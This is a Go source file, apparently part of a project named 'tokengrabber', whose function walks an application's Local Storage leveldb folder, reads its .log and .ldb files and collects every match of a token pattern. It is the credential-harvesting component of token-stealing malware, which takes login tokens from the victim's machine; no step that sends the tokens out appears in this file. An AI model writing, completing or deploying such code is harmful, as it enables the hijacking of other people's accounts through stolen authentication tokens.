package findTokens.go

import (
	"bytes"
	"os"
	"strings"

	"tokengrabber/utils"
)

func FindTokens(path string) []string {
	path += "/Local Storage/leveldb/"
	files, _ := os.ReadDir(path)
	var tokens []string

	for _, file := range files {
		name := file.Name()
		if strings.HasSuffix(name, ".log") || strings.HasSuffix(name, ".ldb") {
			content, _ := os.ReadFile(path + "/" + name)
			lines := bytes.Split(content, []byte("\\n"))
			for _, line := range lines {
				for _, match := range utils.TokenRe.FindAll(line, -1) {
					tokens = append(tokens, string(match))
				}
			}
		}
	}
	return tokens
}
